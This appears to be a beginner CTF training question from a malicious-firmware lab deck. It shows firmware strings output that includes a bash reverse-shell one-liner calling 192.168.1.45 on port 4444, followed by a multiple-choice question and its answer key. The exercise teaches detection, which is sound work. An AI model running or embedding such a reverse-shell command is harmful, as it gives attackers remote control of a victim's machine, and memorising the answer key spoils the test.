![image](/FilesForLabs/images/blueantisyphon.png)

# Easy CTF 1 - Firmware String Extraction

A security analyst extracts a firmware binary from a workstation that was flagged during routine auditing. They run a basic strings analysis on it and find the following output among the results:

```
UEFI Firmware v2.1
Copyright (c) 2021 LegitVendor Inc.
Initializing hardware...
/bin/sh -i >& /dev/tcp/192.168.1.45/4444 0>&1
Loading boot manager...
Secure Boot: DISABLED
```

---

## Question

What does the presence of `/bin/sh -i >& /dev/tcp/192.168.1.45/4444 0>&1` in the firmware binary most likely indicate?

---

## Flags (Choose One)

- **A)** It is a standard diagnostic routine included by the manufacturer
- **B)** The firmware is attempting to benchmark network throughput on boot
- **C)** A reverse shell was embedded into the firmware to call back to an attacker
- **D)** The string is a false positive caused by a corrupted firmware image

---

Correct Flag: **C**

---

# Finished?
[Next Question](MF_easy-2.md)  
[Back to Card's Main Page](/Decks/CORE_v3.1/PER/Malicious_Firmware.md)
